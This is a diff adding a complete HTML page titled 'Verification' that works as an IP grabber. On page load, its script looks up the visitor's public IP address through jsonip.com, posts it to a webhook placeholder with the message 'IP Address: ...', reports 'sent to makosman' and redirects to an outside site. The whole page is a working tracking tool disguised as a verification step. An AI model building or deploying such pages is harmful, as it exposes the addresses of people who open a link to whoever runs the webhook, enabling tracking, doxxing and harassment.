@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Verification</title>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+	<style>
+		body {
+			margin: 0;
+			padding: 0;
+			background-image: url('https://media.tenor.com/nyfj2RItenkAAAAC/blank.gif');
+			background-size: cover;
+			background-position: center;
+			height: 100%;
+		}
+
+		#message1 {
+			position: absolute;
+			top: 0;
+			left: 0;
+			background-color: black;
+			color: white;
+			padding: 10px;
+			font-size: 18px;
+			display: none;
+			z-index: 1;
+		}
+
+		#message2 {
+			position: absolute;
+			top: 0;
+			left: 0;
+			background-color: black;
+			color: white;
+			padding: 10px;
+			font-size: 18px;
+			display: none;
+			z-index: 1;
+		}
+	</style>
+	<script>
+		$(document).ready(function() {
+			$("#message1").fadeIn(2000).fadeOut(2000);
+			setTimeout(function() {
+				$.getJSON("https://jsonip.com?callback=?", function(data) {
+					var ipAddress = data.ip;
+					$.ajax({
+						type: "POST",
+						url: "WEBHOOK HERE",
+						contentType: "application/json",
+						data: JSON.stringify({"content": "IP Address: " + ipAddress}),
+						success: function() {
+							console.log("IP address sent to makosman!");
+							$("#message2").fadeIn(2000).fadeOut(2000, function() {
+								window.location.href = "http://makos.rf.gd";
+							});
+						},
+						error: function(xhr, status, error) {
+							console.error("Error sending IP address to makosman: " + error);
+						}
+					});
+				});
+			}, 4000);
+		});
+	</script>
+</head>
+<body>
+	<div id="message1">Please wait while your IP address is being retrieved...</div>
+	<div id="message2">Your IP address has been successfully sent to makosman!</div>
+</body>
+</html>
